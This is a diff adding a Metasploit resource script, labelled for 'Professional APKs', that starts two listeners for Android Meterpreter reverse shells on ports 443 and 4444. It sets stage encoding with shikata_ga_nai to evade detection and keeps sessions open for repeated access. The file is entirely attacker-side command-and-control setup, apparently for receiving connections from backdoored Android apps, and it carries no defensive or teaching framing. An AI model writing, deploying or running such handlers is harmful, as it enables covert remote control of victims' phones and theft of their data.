@@ -1,0 +1,24 @@
+# Multi-Handler Configuration for Professional APKs
+# Created: 2025-11-22
+
+# Handler 1: HTTPS Payload (Port 443)
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 443
+set ExitOnSession false
+set SessionCommunicationTimeout 300
+set SessionExpirationTimeout 600
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+exploit -j -z
+
+# Handler 2: TCP Payload (Port 4444) - Backup
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+set ExitOnSession false
+set SessionCommunicationTimeout 300
+set SessionExpirationTimeout 600
+exploit -j -z
